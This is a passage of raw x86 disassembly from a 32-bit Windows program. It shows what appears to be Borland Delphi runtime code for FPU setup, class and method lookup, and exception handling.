  403d13:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403d16:	50                   	push   %eax
  403d17:	e8 44 d5 ff ff       	call   0x401260
  403d1c:	c3                   	ret
  403d1d:	e9 72 07 00 00       	jmp    0x404494
  403d22:	eb ef                	jmp    0x403d13
  403d24:	66 a1 20 c0 41 00    	mov    0x41c020,%ax
  403d2a:	66 25 c0 ff          	and    $0xffc0,%ax
  403d2e:	66 8b 55 f8          	mov    -0x8(%ebp),%dx
  403d32:	66 83 e2 3f          	and    $0x3f,%dx
  403d36:	66 0b c2             	or     %dx,%ax
  403d39:	66 a3 20 c0 41 00    	mov    %ax,0x41c020
  403d3f:	8b e5                	mov    %ebp,%esp
  403d41:	5d                   	pop    %ebp
  403d42:	c3                   	ret
  403d43:	00 53 4f             	add    %dl,0x4f(%ebx)
  403d46:	46                   	inc    %esi
  403d47:	54                   	push   %esp
  403d48:	57                   	push   %edi
  403d49:	41                   	inc    %ecx
  403d4a:	52                   	push   %edx
  403d4b:	45                   	inc    %ebp
  403d4c:	5c                   	pop    %esp
  403d4d:	42                   	inc    %edx
  403d4e:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4f:	72 6c                	jb     0x403dbd
  403d51:	61                   	popa
  403d52:	6e                   	outsb  %ds:(%esi),(%dx)
  403d53:	64 5c                	fs pop %esp
  403d55:	44                   	inc    %esp
  403d56:	65 6c                	gs insb (%dx),%es:(%edi)
  403d58:	70 68                	jo     0x403dc2
  403d5a:	69 5c 52 54 4c 00 46 	imul   $0x5046004c,0x54(%edx,%edx,2),%ebx
  403d61:	50 
  403d62:	55                   	push   %ebp
  403d63:	4d                   	dec    %ebp
  403d64:	61                   	popa
  403d65:	73 6b                	jae    0x403dd2
  403d67:	56                   	push   %esi
  403d68:	61                   	popa
  403d69:	6c                   	insb   (%dx),%es:(%edi)
  403d6a:	75 65                	jne    0x403dd1
  403d6c:	00 00                	add    %al,(%eax)
  403d6e:	00 00                	add    %al,(%eax)
  403d70:	db e3                	fninit
  403d72:	9b d9 2d 20 c0 41 00 	fldcw  0x41c020
  403d79:	c3                   	ret
  403d7a:	8b c0                	mov    %eax,%eax
  403d7c:	51                   	push   %ecx
  403d7d:	8b 00                	mov    (%eax),%eax
  403d7f:	89 04 24             	mov    %eax,(%esp)
  403d82:	8b 04 24             	mov    (%esp),%eax
  403d85:	5a                   	pop    %edx
  403d86:	c3                   	ret
  403d87:	90                   	nop
  403d88:	56                   	push   %esi
  403d89:	57                   	push   %edi
  403d8a:	89 d7                	mov    %edx,%edi
  403d8c:	8b 70 d4             	mov    -0x2c(%eax),%esi
  403d8f:	31 c9                	xor    %ecx,%ecx
  403d91:	8a 0e                	mov    (%esi),%cl
  403d93:	41                   	inc    %ecx
  403d94:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403d96:	5f                   	pop    %edi
  403d97:	5e                   	pop    %esi
  403d98:	c3                   	ret
  403d99:	8d 40 00             	lea    0x0(%eax),%eax
  403d9c:	8b 40 dc             	mov    -0x24(%eax),%eax
  403d9f:	85 c0                	test   %eax,%eax
  403da1:	74 02                	je     0x403da5
  403da3:	8b 00                	mov    (%eax),%eax
  403da5:	c3                   	ret
  403da6:	8b c0                	mov    %eax,%eax
  403da8:	53                   	push   %ebx
  403da9:	8b d8                	mov    %eax,%ebx
  403dab:	8b c3                	mov    %ebx,%eax
  403dad:	e8 26 00 00 00       	call   0x403dd8
  403db2:	e8 2d ec ff ff       	call   0x4029e4
  403db7:	8b d0                	mov    %eax,%edx
  403db9:	8b c3                	mov    %ebx,%eax
  403dbb:	e8 5c 00 00 00       	call   0x403e1c
  403dc0:	5b                   	pop    %ebx
  403dc1:	c3                   	ret
  403dc2:	8b c0                	mov    %eax,%eax
  403dc4:	53                   	push   %ebx
  403dc5:	8b d8                	mov    %eax,%ebx
  403dc7:	8b c3                	mov    %ebx,%eax
  403dc9:	e8 a6 00 00 00       	call   0x403e74
  403dce:	8b c3                	mov    %ebx,%eax
  403dd0:	e8 3f ec ff ff       	call   0x402a14
  403dd5:	5b                   	pop    %ebx
  403dd6:	c3                   	ret
  403dd7:	90                   	nop
  403dd8:	83 c0 d8             	add    $0xffffffd8,%eax
  403ddb:	8b 00                	mov    (%eax),%eax
  403ddd:	c3                   	ret
  403dde:	8b c0                	mov    %eax,%eax
  403de0:	84 d2                	test   %dl,%dl
  403de2:	74 08                	je     0x403dec
  403de4:	83 c4 f0             	add    $0xfffffff0,%esp
  403de7:	e8 78 02 00 00       	call   0x404064
  403dec:	84 d2                	test   %dl,%dl
  403dee:	74 0f                	je     0x403dff
  403df0:	e8 c7 02 00 00       	call   0x4040bc
  403df5:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  403dfc:	83 c4 0c             	add    $0xc,%esp
  403dff:	c3                   	ret
  403e00:	e8 c7 02 00 00       	call   0x4040cc
  403e05:	84 d2                	test   %dl,%dl
  403e07:	7e 05                	jle    0x403e0e
  403e09:	e8 a6 02 00 00       	call   0x4040b4
  403e0e:	c3                   	ret
  403e0f:	90                   	nop
  403e10:	85 c0                	test   %eax,%eax
  403e12:	74 07                	je     0x403e1b
  403e14:	b2 01                	mov    $0x1,%dl
  403e16:	8b 08                	mov    (%eax),%ecx
  403e18:	ff 51 fc             	call   *-0x4(%ecx)
  403e1b:	c3                   	ret
  403e1c:	53                   	push   %ebx
  403e1d:	56                   	push   %esi
  403e1e:	57                   	push   %edi
  403e1f:	89 c3                	mov    %eax,%ebx
  403e21:	89 d7                	mov    %edx,%edi
  403e23:	ab                   	stos   %eax,%es:(%edi)
  403e24:	8b 4b d8             	mov    -0x28(%ebx),%ecx
  403e27:	31 c0                	xor    %eax,%eax
  403e29:	51                   	push   %ecx
  403e2a:	c1 e9 02             	shr    $0x2,%ecx
  403e2d:	49                   	dec    %ecx
  403e2e:	f3 ab                	rep stos %eax,%es:(%edi)
  403e30:	59                   	pop    %ecx
  403e31:	83 e1 03             	and    $0x3,%ecx
  403e34:	f3 aa                	rep stos %al,%es:(%edi)
  403e36:	89 d0                	mov    %edx,%eax
  403e38:	89 e2                	mov    %esp,%edx
  403e3a:	8b 4b b8             	mov    -0x48(%ebx),%ecx
  403e3d:	85 c9                	test   %ecx,%ecx
  403e3f:	74 01                	je     0x403e42
  403e41:	51                   	push   %ecx
  403e42:	8b 5b dc             	mov    -0x24(%ebx),%ebx
  403e45:	85 db                	test   %ebx,%ebx
  403e47:	74 04                	je     0x403e4d
  403e49:	8b 1b                	mov    (%ebx),%ebx
  403e4b:	eb ed                	jmp    0x403e3a
  403e4d:	39 d4                	cmp    %edx,%esp
  403e4f:	74 1d                	je     0x403e6e
  403e51:	5b                   	pop    %ebx
  403e52:	8b 0b                	mov    (%ebx),%ecx
  403e54:	83 c3 04             	add    $0x4,%ebx
  403e57:	8b 73 10             	mov    0x10(%ebx),%esi
  403e5a:	85 f6                	test   %esi,%esi
  403e5c:	74 06                	je     0x403e64
  403e5e:	8b 7b 14             	mov    0x14(%ebx),%edi
  403e61:	89 34 07             	mov    %esi,(%edi,%eax,1)
  403e64:	83 c3 1c             	add    $0x1c,%ebx
  403e67:	49                   	dec    %ecx
  403e68:	75 ed                	jne    0x403e57
  403e6a:	39 d4                	cmp    %edx,%esp
  403e6c:	75 e3                	jne    0x403e51
  403e6e:	5f                   	pop    %edi
  403e6f:	5e                   	pop    %esi
  403e70:	5b                   	pop    %ebx
  403e71:	c3                   	ret
  403e72:	8b c0                	mov    %eax,%eax
  403e74:	53                   	push   %ebx
  403e75:	56                   	push   %esi
  403e76:	89 c3                	mov    %eax,%ebx
  403e78:	89 c6                	mov    %eax,%esi
  403e7a:	8b 36                	mov    (%esi),%esi
  403e7c:	8b 56 c0             	mov    -0x40(%esi),%edx
  403e7f:	8b 76 dc             	mov    -0x24(%esi),%esi
  403e82:	85 d2                	test   %edx,%edx
  403e84:	74 07                	je     0x403e8d
  403e86:	e8 19 16 00 00       	call   0x4054a4
  403e8b:	89 d8                	mov    %ebx,%eax
  403e8d:	85 f6                	test   %esi,%esi
  403e8f:	75 e9                	jne    0x403e7a
  403e91:	5e                   	pop    %esi
  403e92:	5b                   	pop    %ebx
  403e93:	c3                   	ret
  403e94:	87 d1                	xchg   %edx,%ecx
  403e96:	81 f9 00 00 00 ff    	cmp    $0xff000000,%ecx
  403e9c:	73 11                	jae    0x403eaf
  403e9e:	81 f9 00 00 00 fe    	cmp    $0xfe000000,%ecx
  403ea4:	72 07                	jb     0x403ead
  403ea6:	0f bf c9             	movswl %cx,%ecx
  403ea9:	03 08                	add    (%eax),%ecx
  403eab:	ff 21                	jmp    *(%ecx)
  403ead:	ff e1                	jmp    *%ecx
  403eaf:	81 e1 ff ff ff 00    	and    $0xffffff,%ecx
  403eb5:	01 c1                	add    %eax,%ecx
  403eb7:	89 d0                	mov    %edx,%eax
  403eb9:	8b 11                	mov    (%ecx),%edx
  403ebb:	e9 c8 22 00 00       	jmp    0x406188
  403ec0:	c3                   	ret
  403ec1:	8d 40 00             	lea    0x0(%eax),%eax
  403ec4:	55                   	push   %ebp
  403ec5:	8b ec                	mov    %esp,%ebp
  403ec7:	83 c4 f8             	add    $0xfffffff8,%esp
  403eca:	53                   	push   %ebx
  403ecb:	56                   	push   %esi
  403ecc:	57                   	push   %edi
  403ecd:	33 db                	xor    %ebx,%ebx
  403ecf:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  403ed2:	8b d9                	mov    %ecx,%ebx
  403ed4:	8b fa                	mov    %edx,%edi
  403ed6:	8b f0                	mov    %eax,%esi
  403ed8:	33 c0                	xor    %eax,%eax
  403eda:	55                   	push   %ebp
  403edb:	68 52 3f 40 00       	push   $0x403f52
  403ee0:	64 ff 30             	push   %fs:(%eax)
  403ee3:	64 89 20             	mov    %esp,%fs:(%eax)
  403ee6:	33 c0                	xor    %eax,%eax
  403ee8:	89 03                	mov    %eax,(%ebx)
  403eea:	8b d7                	mov    %edi,%edx
  403eec:	8b 06                	mov    (%esi),%eax
  403eee:	e8 71 00 00 00       	call   0x403f64
  403ef3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403ef6:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  403efa:	74 38                	je     0x403f34
  403efc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403eff:	8b 40 14             	mov    0x14(%eax),%eax
  403f02:	85 c0                	test   %eax,%eax
  403f04:	74 14                	je     0x403f1a
  403f06:	8b d0                	mov    %eax,%edx
  403f08:	03 d6                	add    %esi,%edx
  403f0a:	89 13                	mov    %edx,(%ebx)
  403f0c:	85 d2                	test   %edx,%edx
  403f0e:	74 24                	je     0x403f34
  403f10:	8b 03                	mov    (%ebx),%eax
  403f12:	50                   	push   %eax
  403f13:	8b 00                	mov    (%eax),%eax
  403f15:	ff 50 04             	call   *0x4(%eax)
  403f18:	eb 1a                	jmp    0x403f34
  403f1a:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  403f1d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403f20:	8b 50 18             	mov    0x18(%eax),%edx
  403f23:	8b c6                	mov    %esi,%eax
  403f25:	e8 6a ff ff ff       	call   0x403e94
  403f2a:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403f2d:	8b c3                	mov    %ebx,%eax
  403f2f:	e8 54 22 00 00       	call   0x406188
  403f34:	83 3b 00             	cmpl   $0x0,(%ebx)
  403f37:	0f 95 c0             	setne  %al
  403f3a:	8b d8                	mov    %eax,%ebx
  403f3c:	33 c0                	xor    %eax,%eax
  403f3e:	5a                   	pop    %edx
  403f3f:	59                   	pop    %ecx
  403f40:	59                   	pop    %ecx
  403f41:	64 89 10             	mov    %edx,%fs:(%eax)
  403f44:	68 59 3f 40 00       	push   $0x403f59
  403f49:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403f4c:	e8 1f 22 00 00       	call   0x406170
  403f51:	c3                   	ret
  403f52:	e9 3d 05 00 00       	jmp    0x404494
  403f57:	eb f0                	jmp    0x403f49
  403f59:	8b c3                	mov    %ebx,%eax
  403f5b:	5f                   	pop    %edi
  403f5c:	5e                   	pop    %esi
  403f5d:	5b                   	pop    %ebx
  403f5e:	59                   	pop    %ecx
  403f5f:	59                   	pop    %ecx
  403f60:	5d                   	pop    %ebp
  403f61:	c3                   	ret
  403f62:	8b c0                	mov    %eax,%eax
  403f64:	53                   	push   %ebx
  403f65:	56                   	push   %esi
  403f66:	89 c3                	mov    %eax,%ebx
  403f68:	8b 43 b8             	mov    -0x48(%ebx),%eax
  403f6b:	85 c0                	test   %eax,%eax
  403f6d:	74 29                	je     0x403f98
  403f6f:	8b 08                	mov    (%eax),%ecx
  403f71:	83 c0 04             	add    $0x4,%eax
  403f74:	8b 32                	mov    (%edx),%esi
  403f76:	3b 30                	cmp    (%eax),%esi
  403f78:	75 18                	jne    0x403f92
  403f7a:	8b 72 04             	mov    0x4(%edx),%esi
  403f7d:	3b 70 04             	cmp    0x4(%eax),%esi
  403f80:	75 10                	jne    0x403f92
  403f82:	8b 72 08             	mov    0x8(%edx),%esi
  403f85:	3b 70 08             	cmp    0x8(%eax),%esi
  403f88:	75 08                	jne    0x403f92
  403f8a:	8b 72 0c             	mov    0xc(%edx),%esi
  403f8d:	3b 70 0c             	cmp    0xc(%eax),%esi
  403f90:	74 13                	je     0x403fa5
  403f92:	83 c0 1c             	add    $0x1c,%eax
  403f95:	49                   	dec    %ecx
  403f96:	75 dc                	jne    0x403f74
  403f98:	8b 5b dc             	mov    -0x24(%ebx),%ebx
  403f9b:	85 db                	test   %ebx,%ebx
  403f9d:	74 04                	je     0x403fa3
  403f9f:	8b 1b                	mov    (%ebx),%ebx
  403fa1:	eb c5                	jmp    0x403f68
  403fa3:	31 c0                	xor    %eax,%eax
  403fa5:	5e                   	pop    %esi
  403fa6:	5b                   	pop    %ebx
  403fa7:	c3                   	ret
  403fa8:	53                   	push   %ebx
  403fa9:	56                   	push   %esi
  403faa:	8b f2                	mov    %edx,%esi
  403fac:	8b d8                	mov    %eax,%ebx
  403fae:	85 db                	test   %ebx,%ebx
  403fb0:	74 0d                	je     0x403fbf
  403fb2:	8b d6                	mov    %esi,%edx
  403fb4:	8b 03                	mov    (%ebx),%eax
  403fb6:	e8 59 00 00 00       	call   0x404014
  403fbb:	84 c0                	test   %al,%al
  403fbd:	75 05                	jne    0x403fc4
  403fbf:	33 c0                	xor    %eax,%eax
  403fc1:	5e                   	pop    %esi
  403fc2:	5b                   	pop    %ebx
  403fc3:	c3                   	ret
  403fc4:	b0 01                	mov    $0x1,%al
  403fc6:	5e                   	pop    %esi
  403fc7:	5b                   	pop    %ebx
  403fc8:	c3                   	ret
  403fc9:	8d 40 00             	lea    0x0(%eax),%eax
  403fcc:	57                   	push   %edi
  403fcd:	96                   	xchg   %eax,%esi
  403fce:	eb 02                	jmp    0x403fd2
  403fd0:	8b 36                	mov    (%esi),%esi
  403fd2:	8b 7e d0             	mov    -0x30(%esi),%edi
  403fd5:	85 ff                	test   %edi,%edi
  403fd7:	74 0d                	je     0x403fe6
  403fd9:	0f b7 0f             	movzwl (%edi),%ecx
  403fdc:	51                   	push   %ecx
  403fdd:	83 c7 02             	add    $0x2,%edi
  403fe0:	f2 66 af             	repnz scas %es:(%edi),%ax
  403fe3:	74 0a                	je     0x403fef
  403fe5:	59                   	pop    %ecx
  403fe6:	8b 76 dc             	mov    -0x24(%esi),%esi
  403fe9:	85 f6                	test   %esi,%esi
  403feb:	75 e3                	jne    0x403fd0
  403fed:	5f                   	pop    %edi
  403fee:	c3                   	ret
  403fef:	58                   	pop    %eax
  403ff0:	01 c0                	add    %eax,%eax
  403ff2:	29 c8                	sub    %ecx,%eax
  403ff4:	8b 74 47 fc          	mov    -0x4(%edi,%eax,2),%esi
  403ff8:	5f                   	pop    %edi
  403ff9:	c3                   	ret
  403ffa:	8b c0                	mov    %eax,%eax
  403ffc:	50                   	push   %eax
  403ffd:	51                   	push   %ecx
  403ffe:	8b 00                	mov    (%eax),%eax
  404000:	e8 c7 ff ff ff       	call   0x403fcc
  404005:	59                   	pop    %ecx
  404006:	58                   	pop    %eax
  404007:	74 02                	je     0x40400b
  404009:	ff e6                	jmp    *%esi
  40400b:	59                   	pop    %ecx
  40400c:	e9 0f ef ff ff       	jmp    0x402f20
  404011:	c3                   	ret
  404012:	8b c0                	mov    %eax,%eax
  404014:	eb 02                	jmp    0x404018
  404016:	8b 00                	mov    (%eax),%eax
  404018:	39 d0                	cmp    %edx,%eax
  40401a:	74 08                	je     0x404024
  40401c:	8b 40 dc             	mov    -0x24(%eax),%eax
  40401f:	85 c0                	test   %eax,%eax
  404021:	75 f3                	jne    0x404016
  404023:	c3                   	ret
  404024:	b0 01                	mov    $0x1,%al
  404026:	c3                   	ret
  404027:	90                   	nop
  404028:	b8 ff ff 00 80       	mov    $0x8000ffff,%eax
  40402d:	c3                   	ret
  40402e:	8b c0                	mov    %eax,%eax
  404030:	c3                   	ret
  404031:	8d 40 00             	lea    0x0(%eax),%eax
  404034:	c3                   	ret
  404035:	8d 40 00             	lea    0x0(%eax),%eax
  404038:	c3                   	ret
  404039:	8d 40 00             	lea    0x0(%eax),%eax
  40403c:	56                   	push   %esi
  40403d:	66 8b 32             	mov    (%edx),%si
  404040:	66 09 f6             	or     %si,%si
  404043:	74 17                	je     0x40405c
  404045:	66 81 fe 00 c0       	cmp    $0xc000,%si
  40404a:	73 10                	jae    0x40405c
  40404c:	50                   	push   %eax
  40404d:	8b 00                	mov    (%eax),%eax
  40404f:	e8 78 ff ff ff       	call   0x403fcc
  404054:	58                   	pop    %eax
  404055:	74 05                	je     0x40405c
  404057:	89 f1                	mov    %esi,%ecx
  404059:	5e                   	pop    %esi
  40405a:	ff e1                	jmp    *%ecx
  40405c:	5e                   	pop    %esi
  40405d:	8b 08                	mov    (%eax),%ecx
  40405f:	ff 61 f0             	jmp    *-0x10(%ecx)
  404062:	c3                   	ret
  404063:	90                   	nop
  404064:	52                   	push   %edx
  404065:	51                   	push   %ecx
  404066:	53                   	push   %ebx
  404067:	84 d2                	test   %dl,%dl
  404069:	7c 03                	jl     0x40406e
  40406b:	ff 50 f4             	call   *-0xc(%eax)
  40406e:	31 d2                	xor    %edx,%edx
  404070:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  404074:	64 8b 1a             	mov    %fs:(%edx),%ebx
  404077:	89 19                	mov    %ebx,(%ecx)
  404079:	89 69 08             	mov    %ebp,0x8(%ecx)
  40407c:	c7 41 04 8d 40 40 00 	movl   $0x40408d,0x4(%ecx)
  404083:	89 41 0c             	mov    %eax,0xc(%ecx)
  404086:	64 89 0a             	mov    %ecx,%fs:(%edx)
  404089:	5b                   	pop    %ebx
  40408a:	59                   	pop    %ecx
  40408b:	5a                   	pop    %edx
  40408c:	c3                   	ret
  40408d:	e9 4e 01 00 00       	jmp    0x4041e0
  404092:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404096:	8b 40 0c             	mov    0xc(%eax),%eax
  404099:	85 c0                	test   %eax,%eax
  40409b:	74 0e                	je     0x4040ab
  40409d:	8b 08                	mov    (%eax),%ecx
  40409f:	b2 81                	mov    $0x81,%dl
  4040a1:	50                   	push   %eax
  4040a2:	ff 51 fc             	call   *-0x4(%ecx)
  4040a5:	58                   	pop    %eax
  4040a6:	e8 09 00 00 00       	call   0x4040b4
  4040ab:	e8 44 04 00 00       	call   0x4044f4
  4040b0:	c3                   	ret
  4040b1:	8d 40 00             	lea    0x0(%eax),%eax
  4040b4:	8b 10                	mov    (%eax),%edx
  4040b6:	ff 52 f8             	call   *-0x8(%edx)
  4040b9:	c3                   	ret
  4040ba:	8b c0                	mov    %eax,%eax
  4040bc:	53                   	push   %ebx
  4040bd:	8b d8                	mov    %eax,%ebx
  4040bf:	8b c3                	mov    %ebx,%eax
  4040c1:	8b 10                	mov    (%eax),%edx
  4040c3:	ff 52 e4             	call   *-0x1c(%edx)
  4040c6:	8b c3                	mov    %ebx,%eax
  4040c8:	5b                   	pop    %ebx
  4040c9:	c3                   	ret
  4040ca:	8b c0                	mov    %eax,%eax
  4040cc:	84 d2                	test   %dl,%dl
  4040ce:	7f 01                	jg     0x4040d1
  4040d0:	c3                   	ret
  4040d1:	50                   	push   %eax
  4040d2:	52                   	push   %edx
  4040d3:	8b 10                	mov    (%eax),%edx
  4040d5:	ff 52 e8             	call   *-0x18(%edx)
  4040d8:	5a                   	pop    %edx
  4040d9:	58                   	pop    %eax
  4040da:	c3                   	ret
  4040db:	90                   	nop
  4040dc:	80 3d 24 c0 41 00 01 	cmpb   $0x1,0x41c024
  4040e3:	76 11                	jbe    0x4040f6
  4040e5:	6a 00                	push   $0x0
  4040e7:	6a 00                	push   $0x0
  4040e9:	6a 00                	push   $0x0
  4040eb:	68 df fa ed 0e       	push   $0xeedfadf
  4040f0:	ff 15 14 d0 41 00    	call   *0x41d014
  4040f6:	c3                   	ret
  4040f7:	90                   	nop
  4040f8:	80 3d 24 c0 41 00 00 	cmpb   $0x0,0x41c024
  4040ff:	74 17                	je     0x404118
  404101:	50                   	push   %eax
  404102:	50                   	push   %eax
  404103:	52                   	push   %edx
  404104:	54                   	push   %esp
  404105:	6a 02                	push   $0x2
  404107:	6a 00                	push   $0x0
  404109:	68 e4 fa ed 0e       	push   $0xeedfae4
  40410e:	ff 15 14 d0 41 00    	call   *0x41d014
  404114:	83 c4 08             	add    $0x8,%esp
  404117:	58                   	pop    %eax
  404118:	c3                   	ret
  404119:	8d 40 00             	lea    0x0(%eax),%eax
  40411c:	54                   	push   %esp
  40411d:	6a 01                	push   $0x1
  40411f:	6a 00                	push   $0x0
  404121:	68 e0 fa ed 0e       	push   $0xeedfae0
  404126:	ff 15 14 d0 41 00    	call   *0x41d014
  40412c:	83 c4 04             	add    $0x4,%esp
  40412f:	58                   	pop    %eax
  404130:	c3                   	ret
  404131:	8d 40 00             	lea    0x0(%eax),%eax
  404134:	80 3d 24 c0 41 00 01 	cmpb   $0x1,0x41c024
  40413b:	76 09                	jbe    0x404146
  40413d:	50                   	push   %eax
  40413e:	ff 73 04             	push   0x4(%ebx)
  404141:	e9 d6 ff ff ff       	jmp    0x40411c
  404146:	c3                   	ret
  404147:	90                   	nop
  404148:	80 3d 24 c0 41 00 01 	cmpb   $0x1,0x41c024
  40414f:	76 07                	jbe    0x404158
  404151:	50                   	push   %eax
  404152:	53                   	push   %ebx
  404153:	e9 c4 ff ff ff       	jmp    0x40411c
  404158:	c3                   	ret
  404159:	8d 40 00             	lea    0x0(%eax),%eax
  40415c:	85 c9                	test   %ecx,%ecx
  40415e:	74 19                	je     0x404179
  404160:	8b 41 01             	mov    0x1(%ecx),%eax
  404163:	80 39 e9             	cmpb   $0xe9,(%ecx)
  404166:	74 0c                	je     0x404174
  404168:	80 39 eb             	cmpb   $0xeb,(%ecx)
  40416b:	75 0c                	jne    0x404179
  40416d:	0f be c0             	movsbl %al,%eax
  404170:	41                   	inc    %ecx
  404171:	41                   	inc    %ecx
  404172:	eb 03                	jmp    0x404177
  404174:	83 c1 05             	add    $0x5,%ecx
  404177:	01 c1                	add    %eax,%ecx
  404179:	c3                   	ret
  40417a:	8b c0                	mov    %eax,%eax
  40417c:	80 3d 24 c0 41 00 01 	cmpb   $0x1,0x41c024
  404183:	76 1d                	jbe    0x4041a2
  404185:	50                   	push   %eax
  404186:	52                   	push   %edx
  404187:	51                   	push   %ecx
  404188:	e8 cf ff ff ff       	call   0x40415c
  40418d:	51                   	push   %ecx
  40418e:	54                   	push   %esp
  40418f:	6a 01                	push   $0x1
  404191:	6a 00                	push   $0x0
  404193:	68 e1 fa ed 0e       	push   $0xeedfae1
  404198:	ff 15 14 d0 41 00    	call   *0x41d014
  40419e:	59                   	pop    %ecx
  40419f:	59                   	pop    %ecx
  4041a0:	5a                   	pop    %edx
  4041a1:	58                   	pop    %eax
  4041a2:	c3                   	ret
  4041a3:	90                   	nop
  4041a4:	80 3d 24 c0 41 00 01 	cmpb   $0x1,0x41c024
  4041ab:	76 12                	jbe    0x4041bf
  4041ad:	52                   	push   %edx
  4041ae:	54                   	push   %esp
  4041af:	6a 01                	push   $0x1
  4041b1:	6a 00                	push   $0x0
  4041b3:	68 e2 fa ed 0e       	push   $0xeedfae2
  4041b8:	ff 15 14 d0 41 00    	call   *0x41d014
  4041be:	5a                   	pop    %edx
  4041bf:	c3                   	ret
  4041c0:	50                   	push   %eax
  4041c1:	52                   	push   %edx
  4041c2:	80 3d 24 c0 41 00 01 	cmpb   $0x1,0x41c024
  4041c9:	76 10                	jbe    0x4041db
  4041cb:	54                   	push   %esp
  4041cc:	6a 02                	push   $0x2
  4041ce:	6a 00                	push   $0x0
  4041d0:	68 e3 fa ed 0e       	push   $0xeedfae3
  4041d5:	ff 15 14 d0 41 00    	call   *0x41d014
  4041db:	5a                   	pop    %edx
  4041dc:	58                   	pop    %eax
  4041dd:	c3                   	ret
  4041de:	8b c0                	mov    %eax,%eax
  4041e0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4041e4:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  4041eb:	0f 85 13 01 00 00    	jne    0x404304
  4041f1:	81 38 de fa ed 0e    	cmpl   $0xeedfade,(%eax)
  4041f7:	8b 50 18             	mov    0x18(%eax),%edx
  4041fa:	8b 48 14             	mov    0x14(%eax),%ecx
  4041fd:	74 6e                	je     0x40426d
  4041ff:	fc                   	cld
  404200:	e8 6b fb ff ff       	call   0x403d70
  404205:	8b 15 10 d0 41 00    	mov    0x41d010,%edx
  40420b:	85 d2                	test   %edx,%edx
  40420d:	0f 84 f1 00 00 00    	je     0x404304
  404213:	ff d2                	call   *%edx
  404215:	85 c0                	test   %eax,%eax
  404217:	0f 84 e7 00 00 00    	je     0x404304
  40421d:	8b 54 24 0c          	mov    0xc(%esp),%edx
  404221:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404225:	81 39 ce fa ef 0e    	cmpl   $0xeefface,(%ecx)
  40422b:	74 37                	je     0x404264
  40422d:	e8 c6 fe ff ff       	call   0x4040f8
  404232:	80 3d 28 c0 41 00 00 	cmpb   $0x0,0x41c028
  404239:	76 29                	jbe    0x404264
  40423b:	80 3d 24 c0 41 00 00 	cmpb   $0x0,0x41c024
  404242:	77 20                	ja     0x404264
  404244:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  404248:	50                   	push   %eax
  404249:	51                   	push   %ecx
  40424a:	e8 61 cf ff ff       	call   0x4011b0
  40424f:	83 f8 00             	cmp    $0x0,%eax
  404252:	58                   	pop    %eax
  404253:	0f 84 ab 00 00 00    	je     0x404304
  404259:	89 c2                	mov    %eax,%edx
  40425b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40425f:	8b 48 0c             	mov    0xc(%eax),%ecx
  404262:	eb 30                	jmp    0x404294
  404264:	89 c2                	mov    %eax,%edx
  404266:	8b 44 24 04          	mov    0x4(%esp),%eax
  40426a:	8b 48 0c             	mov    0xc(%eax),%ecx
  40426d:	80 3d 28 c0 41 00 01 	cmpb   $0x1,0x41c028
  404274:	76 1e                	jbe    0x404294
  404276:	80 3d 24 c0 41 00 00 	cmpb   $0x0,0x41c024
  40427d:	77 15                	ja     0x404294
  40427f:	50                   	push   %eax
  404280:	8d 44 24 08          	lea    0x8(%esp),%eax
  404284:	52                   	push   %edx
  404285:	51                   	push   %ecx
  404286:	50                   	push   %eax
  404287:	e8 24 cf ff ff       	call   0x4011b0
  40428c:	83 f8 00             	cmp    $0x0,%eax
  40428f:	59                   	pop    %ecx
  404290:	5a                   	pop    %edx
  404291:	58                   	pop    %eax
  404292:	74 70                	je     0x404304
  404294:	83 48 04 02          	orl    $0x2,0x4(%eax)
  404298:	53                   	push   %ebx
  404299:	31 db                	xor    %ebx,%ebx
  40429b:	56                   	push   %esi
  40429c:	57                   	push   %edi
  40429d:	55                   	push   %ebp
  40429e:	64 8b 1b             	mov    %fs:(%ebx),%ebx
  4042a1:	53                   	push   %ebx
  4042a2:	50                   	push   %eax
  4042a3:	52                   	push   %edx
  4042a4:	51                   	push   %ecx
  4042a5:	8b 54 24 28          	mov    0x28(%esp),%edx
  4042a9:	6a 00                	push   $0x0
  4042ab:	50                   	push   %eax
  4042ac:	68 b8 42 40 00       	push   $0x4042b8
  4042b1:	52                   	push   %edx
  4042b2:	ff 15 18 d0 41 00    	call   *0x41d018
  4042b8:	8b 7c 24 28          	mov    0x28(%esp),%edi
  4042bc:	e8 a3 25 00 00       	call   0x406864
  4042c1:	ff b0 00 00 00 00    	push   0x0(%eax)
  4042c7:	89 a0 00 00 00 00    	mov    %esp,0x0(%eax)
  4042cd:	8b 6f 08             	mov    0x8(%edi),%ebp
  4042d0:	8b 5f 04             	mov    0x4(%edi),%ebx
  4042d3:	c7 47 04 e4 42 40 00 	movl   $0x4042e4,0x4(%edi)
  4042da:	83 c3 05             	add    $0x5,%ebx
  4042dd:	e8 66 fe ff ff       	call   0x404148
  4042e2:	ff e3                	jmp    *%ebx
  4042e4:	e9 ab 01 00 00       	jmp    0x404494
  4042e9:	e8 76 25 00 00       	call   0x406864
  4042ee:	8b 88 00 00 00 00    	mov    0x0(%eax),%ecx
  4042f4:	8b 11                	mov    (%ecx),%edx
  4042f6:	89 90 00 00 00 00    	mov    %edx,0x0(%eax)
  4042fc:	8b 41 08             	mov    0x8(%ecx),%eax
  4042ff:	e9 0c fb ff ff       	jmp    0x403e10
  404304:	b8 01 00 00 00       	mov    $0x1,%eax
  404309:	c3                   	ret
  40430a:	8b c0                	mov    %eax,%eax
  40430c:	8b 44 24 04          	mov    0x4(%esp),%eax
  404310:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  404317:	0f 85 6f 01 00 00    	jne    0x40448c
